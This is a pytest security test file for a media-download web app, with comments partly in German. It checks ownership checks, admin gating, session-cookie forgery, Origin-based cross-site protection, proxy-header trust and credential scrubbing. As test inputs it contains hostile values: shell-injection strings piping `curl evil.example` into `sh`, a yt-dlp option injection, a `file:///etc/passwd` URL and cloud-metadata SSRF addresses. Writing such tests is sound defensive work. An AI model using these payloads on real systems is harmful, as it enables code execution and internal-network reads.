"""Authorisation and cross-site protection, over real HTTP.

Every test here replaces a source-text search that could pass while the code
was broken. The motivating example is embarrassing and recent: a `scrub()`
call was added at three sites while the function itself failed to land. The
suite stayed green because nothing executed that path.

These fire requests and read status codes.
"""
import inspect

import pytest

import main
import podcast


# ── One user cannot reach another's work ──────────────────────────────────────

@pytest.fixture
def alice_trim(alice):
    """A trim session owned by alice, without touching the network."""
    main.trims["t-alice"] = {
        "status": "ready", "user_id": alice["id"], "duration": 60.0,
        "title": "Alices Aufnahme", "created": main.datetime.now().isoformat(),
    }
    yield "t-alice"
    main.trims.pop("t-alice", None)


@pytest.fixture
def alice_podcast(alice):
    main.podcasts["p-alice"] = {
        "status": "done", "user_id": alice["id"], "episodes": [],
        "created": main.datetime.now().isoformat(),
    }
    yield "p-alice"
    main.podcasts.pop("p-alice", None)


@pytest.fixture
def alice_job(alice):
    main.jobs["j-alice"] = {
        "status": "done", "user_id": alice["id"], "url": "https://x/y",
        "created": main.datetime.now().isoformat(),
    }
    yield "j-alice"
    main.jobs.pop("j-alice", None)


def test_owner_reaches_their_trim(client, alice, as_user, alice_trim):
    as_user(alice)
    assert client.get(f"/api/trim/{alice_trim}").status_code == 200


def test_stranger_cannot_reach_a_trim(client, alice, bob, as_user, alice_trim):
    """The claim every `"_own_trim" in src` test was standing in for."""
    as_user(bob)
    assert client.get(f"/api/trim/{alice_trim}").status_code == 404


@pytest.mark.parametrize("path", ["", "/audio", "/download"])
def test_every_trim_route_checks_the_owner(client, alice, bob, as_user, alice_trim, path):
    as_user(bob)
    assert client.get(f"/api/trim/{alice_trim}{path}").status_code in (404, 409)


def test_stranger_cannot_reach_a_podcast_package(client, alice, bob, as_user, alice_podcast):
    as_user(bob)
    assert client.get(f"/api/podcast/{alice_podcast}").status_code == 404
    assert client.get(f"/api/podcast/{alice_podcast}/zip").status_code == 404


def test_stranger_cannot_read_a_job(client, alice, bob, as_user, alice_job):
    as_user(bob)
    assert client.get(f"/api/job/{alice_job}").status_code == 404


def test_signed_out_callers_get_401(client, alice_trim):
    client.cookies.clear()
    assert client.get(f"/api/trim/{alice_trim}").status_code == 401


# ── Admin routes ──────────────────────────────────────────────────────────────

ADMIN_GETS = ["/api/admin/stats", "/api/admin/errors", "/api/admin/settings"]


@pytest.mark.parametrize("path", ADMIN_GETS)
def test_ordinary_user_is_refused_admin_routes(client, alice, as_user, path):
    """Twelve admin routes had exactly one source-grep between them."""
    as_user(alice)
    assert client.get(path).status_code == 403


@pytest.mark.parametrize("path", ADMIN_GETS)
def test_admin_reaches_admin_routes(client, admin, as_user, path):
    as_user(admin)
    assert client.get(path).status_code == 200


def test_ordinary_user_cannot_delete_a_user(client, alice, bob, as_user):
    as_user(bob)
    assert client.delete(f"/api/admin/user/{alice['id']}").status_code == 403
    assert main.db.get_user(alice["id"]) is not None


def test_ordinary_user_cannot_abort_everything(client, alice, as_user):
    as_user(alice)
    assert client.post("/api/admin/abort-all").status_code == 403


# ── Session cookies ───────────────────────────────────────────────────────────

def test_tampered_signature_is_rejected(client, alice):
    """The central auth primitive had no test at all."""
    good = main._sign(alice["id"])
    body, _, sig = good.rpartition(".")
    client.cookies.set("hd_session", f"{body}.{'0' * len(sig)}")
    assert client.get("/api/me").status_code == 401


def test_foreign_user_id_cannot_be_swapped_in(client, alice, bob):
    """Changing the id without a matching signature must not work."""
    token = main._sign(alice["id"])
    assert main._unsign(token) == alice["id"]
    forged = token.replace(str(alice["id"]), str(bob["id"]), 1)
    if forged != token:
        assert main._unsign(forged) != bob["id"]


@pytest.mark.parametrize("junk", ["", "x", "a.b.c", "....", "null"])
def test_malformed_cookies_do_not_crash(client, junk):
    client.cookies.set("hd_session", junk)
    assert client.get("/api/me").status_code == 401


def test_expired_session_is_rejected(client, alice, monkeypatch):
    import time as _t
    monkeypatch.setattr(_t, "time", lambda: 0)       # signed in 1970
    old = main._sign(alice["id"])
    monkeypatch.undo()
    client.cookies.set("hd_session", old)
    assert client.get("/api/me").status_code == 401


# ── What /api/me discloses ────────────────────────────────────────────────────

def test_me_does_not_leak_cookie_jars(client, alice, as_user):
    """The user row carries ig_cookies and yt_cookies; _row_to_user only drops
    the password fields. Any endpoint returning the row directly would hand
    them out."""
    main.db.set_cookies(alice["id"], "youtube", "# Netscape\n.youtube.com\tTRUE\t/\tTRUE\t0\tSID\tsecret")
    as_user(alice)
    body = client.get("/api/me").json()
    assert "secret" not in str(body)
    assert "ig_cookies" not in body and "yt_cookies" not in body


def test_cookie_status_never_returns_values(client, alice, as_user):
    main.db.set_cookies(alice["id"], "youtube", "# Netscape\n.youtube.com\tTRUE\t/\tTRUE\t0\tSID\tsecret")
    as_user(alice)
    assert "secret" not in str(client.get("/api/cookies").json())


# ── Cross-site protection in the desktop build ───────────────────────────────

@pytest.fixture
def desktop(monkeypatch):
    monkeypatch.setattr(main, "LOCAL_MODE", True)
    # Seit 10/2026 hängt der entfallende Login an DESKTOP_MODE, nicht an
    # LOCAL_MODE: letzteres lässt sich in die .env eines öffentlichen
    # Containers schreiben. Die Fixture simuliert „läuft als Mac-App", also
    # gehören beide dazu.
    monkeypatch.setattr(main, "DESKTOP_MODE", True)
    monkeypatch.setattr(main, "LOCAL_TOKEN", "testtoken")


def test_desktop_needs_no_login(client, desktop):
    """No password — but the app's token, which only its own WebView has."""
    assert client.get("/?t=testtoken").status_code == 200
    assert client.get("/").status_code == 200          # cookie set by the first load


def test_page_on_the_open_web_cannot_post(client, desktop):
    """The attack this guards: a form body is sent cross-origin without a
    preflight, so a random page could start downloads or overwrite the stored
    cookie jars on a machine where the app is running."""
    r = client.post("/api/cookies", data={"cookies": "", "kind": "youtube"},
                    headers={"Origin": "https://evil.example"})
    # Without the app's cookie it is not even a desktop request.
    assert r.status_code == 401
    # And should a browser ever attach the cookie cross-site anyway (it is
    # SameSite=Strict), the Origin check still stops it.
    client.cookies.set("fundus_local", "testtoken")
    r = client.post("/api/cookies", data={"cookies": "", "kind": "youtube"},
                    headers={"Origin": "https://evil.example"})
    assert r.status_code == 403


def test_the_app_itself_is_allowed_through(client, desktop):
    r = client.post("/api/cookies", data={"cookies": "", "kind": "youtube"},
                    headers={"X-Fundus-Token": "testtoken",
                             "Origin": "https://evil.example"})
    assert r.status_code != 403


def test_reading_is_not_blocked_by_origin(client, desktop):
    """GET carries no risk here and blocking it would break ordinary use."""
    client.cookies.set("fundus_local", "testtoken")
    assert client.get("/", headers={"Origin": "https://evil.example"}).status_code == 200


def test_server_mode_still_demands_a_session(client, monkeypatch):
    monkeypatch.setattr(main, "LOCAL_MODE", False)
    client.cookies.clear()
    assert client.get("/").status_code in (302, 307)


# ── Forwarded headers ─────────────────────────────────────────────────────────

def test_forwarded_for_is_ignored_from_an_untrusted_peer(monkeypatch):
    """Rotating this header shed an admin IP ban and turned the login throttle
    from eight attempts into no limit."""
    monkeypatch.setattr(main, "TRUSTED_PROXIES", set())

    class R:
        headers = {"x-forwarded-for": "1.2.3.4"}
        class client: host = "10.0.0.9"
    assert main._client_ip(R()) == "10.0.0.9"


def test_trusted_proxy_is_honoured(monkeypatch):
    monkeypatch.setattr(main, "TRUSTED_PROXIES", {"10.0.0.9"})

    class R:
        headers = {"x-forwarded-for": "9.9.9.9, 1.2.3.4"}
        class client: host = "10.0.0.9"
    # The rightmost untrusted hop — everything left of it is self-reported.
    assert main._client_ip(R()) == "1.2.3.4"


def test_blocked_ip_is_turned_away(client, alice, as_user):
    as_user(alice)
    main.db.block_ip("127.0.0.1")
    try:
        assert client.get("/api/me").status_code == 403
    finally:
        main.db.unblock_ip("127.0.0.1")


# ── Error text ────────────────────────────────────────────────────────────────

def test_proxy_credentials_are_scrubbed():
    """The function this exercises was once called from three places without
    existing. A source search found the calls and reported success."""
    dirty = "Unable to connect to proxy http://user:hunter2@proxy.example:8080"
    clean = main.scrub(dirty)
    assert "hunter2" not in clean and "user:" not in clean
    assert "proxy.example:8080" in clean


def test_scrub_leaves_ordinary_text_alone():
    assert main.scrub("ERROR: Video unavailable") == "ERROR: Video unavailable"


# ── Befunde des Sicherheitsreviews vom 08.10.2026 ────────────────────────────

def test_host_check_is_not_a_substring_match():
    """Der schwerste Befund. `"threads.com" in url` traf auch
    `https://angreifer.example/threads.com/x`: die URL landete im
    Threads-Pfad, wurde dort MIT den Cookies des Nutzers abgerufen, und der
    Antwortkörper wanderte in den Job-Ordner, der als ZIP herunterladbar
    ist. Damit war das ein Lese-Primitiv ins interne Netz."""
    assert main._is_threads("https://www.threads.com/@a/post/B")
    assert main._is_threads("https://threads.net/@a/post/B")
    for evil in ("https://angreifer.example/threads.com/x",
                 "http://169.254.169.254/?threads.com",
                 "https://notthreads.com/x",
                 "https://evil.example/?u=https://threads.com/"):
        assert not main._is_threads(evil), evil


def test_url_endpoints_demand_a_scheme():
    """yt-dlp liest alles, was mit `-` beginnt, als Option: aus
    `--config-locations=…` wird eine Konfigurationsdatei und daraus `--exec`.
    /api/batch filterte das, /api/trim und /api/transcript nicht."""
    with pytest.raises(Exception):
        main.require_http_url("--config-locations=/tmp/x")
    with pytest.raises(Exception):
        main.require_http_url("file:///etc/passwd")
    assert main.require_http_url(" https://example.com/x ") == "https://example.com/x"


def test_blocked_ip_sees_through_ipv4_mapped_ipv6():
    """`::ffff:127.0.0.1` IST der Loopback, passte aber auf keinen der
    Textpräfixe. Ein AAAA-Record unter Angreiferkontrolle genügte."""
    for blocked in ("127.0.0.1", "::ffff:127.0.0.1", "::ffff:169.254.169.254",
                    "169.254.169.254", "100.100.1.1", "192.0.0.5",
                    "198.18.0.1", "10.0.0.1", "::1", "fd00::1"):
        assert podcast._is_blocked_ip(blocked), blocked
    for ok in ("8.8.8.8", "93.184.216.34", "2606:2800:220:1::"):
        assert not podcast._is_blocked_ip(ok), ok


def test_head_check_does_not_follow_redirects_blindly():
    """Ein erlaubter Feed-Host durfte auf 127.0.0.1 umleiten — geprüft wurde
    nur die erste Adresse. `fetch()` macht es seit jeher Sprung für Sprung."""
    src = inspect.getsource(podcast.head_is_audio)
    assert "allow_redirects=False" in src
    assert src.count("safe_url") >= 2, "Jeder Sprung muss erneut geprüft werden"


def test_generated_scripts_quote_their_inputs():
    """Die erzeugten Scripts sind Dateien zum Doppelklicken. `sh()` war nur
    im Podcast-Builder im Einsatz; die anderen setzten rohe Werte in
    doppelte Anführungszeichen, wo $( ) weiter expandiert."""
    import shlex
    evil = "https://example.com/$(curl evil.example|sh)"
    for script in (main.build_download_script([evil]),
                   main.build_yt_transcript_script(evil),
                   main.build_livestream_script(evil)["steps"][0]["c"]):
        assert f'"{evil}"' not in script
    # Sprachen gehen über eine Allowlist, nicht über Quoting.
    assert "curl" not in main.build_whisper_script(language="de; curl evil|sh")


# ── Fehlerprotokoll im System-Bereich ────────────────────────────────────────

def test_errors_are_scoped_to_the_person_asking():
    """Das Protokoll lag nur im Admin-Bereich, der im lokalen Modus fehlt —
    der Desktop-Nutzer sah seine eigenen Fehler nie. Beim Öffnen für alle
    darf es aber nicht aufgehen: die Einträge enthalten URLs und
    Benutzernamen anderer Leute."""
    src = inspect.getsource(main._own_errors)
    assert "DESKTOP_MODE or user.get(\"is_admin\")" in src
    assert 'e.get("user") == name' in src


def test_clearing_removes_only_your_own_lines():
    src = inspect.getsource(main.own_errors_clear)
    assert 'e.get("user") != name' in src


def test_error_messages_are_scrubbed_on_the_way_out():
    """yt-dlp echot die vollständige Proxy-URL samt Zugangsdaten in seine
    Fehler, und log_error schreibt die Meldung ungefiltert."""
    src = inspect.getsource(main.own_errors)
    assert "scrub(" in src
